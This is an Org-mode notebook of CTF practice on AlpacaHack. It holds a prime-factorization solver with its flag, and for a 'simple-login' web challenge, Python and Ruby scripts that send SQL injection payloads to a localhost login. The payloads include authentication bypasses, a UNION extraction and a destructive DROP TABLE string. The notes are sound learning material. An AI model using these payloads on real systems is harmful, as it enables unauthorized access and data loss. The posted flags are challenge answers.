#+STARTUP: indent show2levels
#+AUTHOR: Shun2439
#+EMAIL: Shun2439@duck.com
#+DATE: <2025-10-16 æœ¨>

#+OPTIONS: H:1 author:nil

* AlpacaHack [1/3]
** DONE [[https://alpacahack.com/daily/challenges/alpacahack-2100][AlpacaHack 2100]]
CLOSED: [2025-12-29 æœˆ 08:18]
# <2025-12-02 ç« 20:18>
[[https://alpacahack.com/daily?month=2100-01][2100å¹´1æœˆ ã®ã‚«ãƒ¬ãƒ³ãƒ€ãƒ¼]]

ðŸš©: src_text[:exports code]{Alpaca{brought_AGI_to_humanity..._yes,_Alpaca_Gentle_Intelligence.}}
** TODO [[https://alpacahack.com/daily/challenges/a-fact-of-CTF][a fact of CTF]]

#+begin_src shell
      curl -OL https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/1703ffac-8c0c-4a2a-a8ff-bb11a932ed56/a-fact-of-CTF.tar.gz

      tar -xzf a-fact-of-CTF
#+end_src

#+begin_src python :tangle solver.py :results output
  from sympy import factorint

  primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293]

  try:
      with open('a-fact-of-CTF/output.txt', 'r') as f:
          ct_hex = f.read().strip() # ä½™è¨ˆãªæ–‡å­—ã‚’å–ã‚Šé™¤ã

      ct = int(ct_hex, 16) # 10é€²æ•°ã®æ•´æ•°ã«å¤‰æ›

      factors = factorint(ct) # ç´ å› æ•°åˆ†è§£ ct = 2**a * 3**b * 5**c ... factorsã¯è¾žæ›¸åž‹ã«ãªã‚‹

      flag = "".join(chr(factors[p]) for p in primes if p in factors)
      print(flag)
  except FileNotFoundError:
      print("File not found")
#+end_src

#+RESULTS:
: Alpaca{prime_factorization_solves_everything}

** TODO simple-login                                                  :web:
:PROPERTIES:
:CATEGORY: web
:END:

- State "TODO"       from              [2025-07-06 Sun 02:12] \\
  not yet

#+CAPTION: Directory Structure
#+begin_example
î—¿ .
â”œâ”€â”€ î™ compose.yaml
â”œâ”€â”€ î—¿ db
â”‚   â””â”€â”€ ï‡€ init.sql
â””â”€â”€ î—¿ web
    â”œâ”€â”€ î˜† app.py
    â”œâ”€â”€ î™ Dockerfile
    â”œâ”€â”€ î˜† requirements.txt
    â””â”€â”€ î—¿ templates
        â”œâ”€â”€ ï„» index.html
        â””â”€â”€ ï„» login.html
#+end_example

*** COMMENT Exploits

#+begin_src python :tangle exploit.py
  import requests
  from urllib.parse import quote

  url = "http://localhost:3000/login"
  username_payload = "' OR 1/0 -- "
  password_payload = "test"

  encoded_username_payload = quote(username_payload)

  data = {
      "username": encoded_username_payload,
      "password": password_payload
  }

  print("Attempting simple error-based injection (1/0)...")
  response = requests.post(url, data=data, allow_redirects=False)

  print(f"Status Code: {response.status_code}")
  print("Headers:")
  for header, value in response.headers.items():
      print(f"  {header}: {value}")
  print("\nBody:")
  print(response.text)
#+end_src

#+RESULTS:

#+begin_src ruby
   require 'net/http'
   require 'uri'

   # Target application details
   $host = 'localhost' # Replace with your Flask app's host
   $port = 3000       # Replace with your Flask app's port
   $login_path = '/login'

   # Function to send a POST request to the login endpoint
   def send_login_request(username, password)
     uri = URI.parse("http://#$host:#$port#$login_path")
     http = Net::HTTP.new(uri.host, uri.port)
     request = Net::HTTP::Post.new(uri.request_uri)
     request.set_form_data({'username' => username, 'password' => password})

     begin
       response = http.request(request)
       puts "Request with username: '#{username}', password: '#{password}'"
       puts "Status Code: #{response.code}"
       puts "Body: #{response.body.inspect}"
       puts "---"
       return response
     rescue Errno::ECONNREFUSED
       puts "Error: Could not connect to the server at http://#{host}:#{port}"
       exit(1)
     end
   end

   # --- Test Payloads ---

   # Simple SQL injection attempts
   payloads = [
     {"username" => "admin'--", "password" => "anything"},
     {"username" => "admin", "password" => "' OR '1'='1'--"},
     {"username" => "' OR 1=1 --", "password" => "anything"},
     {"username" => "'; DROP TABLE users; --", "password" => "anything"}, # Be extremely careful with destructive payloads!
     {"username" => "admin", "password" => "' UNION SELECT * FROM users --"}, # Might reveal data
     {"username" => "admin", "password" => "` OR `1`=`1` --"}, # Using backticks
     {"username" => "admin", "password" => "\" OR \"1\"=\"1\" --"}, # Using double quotes
   ]

   payloads.each do |payload|
     send_login_request(payload["username"], payload["password"])
   end

   # Test with a valid username and a malicious password
   send_login_request("testuser", "' OR '1'='1'--") # Replace 'testuser' if you know a valid one

   # Test with a malicious username and a valid password
   send_login_request("' OR '1'='1'--", "testpassword") # Replace 'testpassword' if you know a valid one
#+end_src

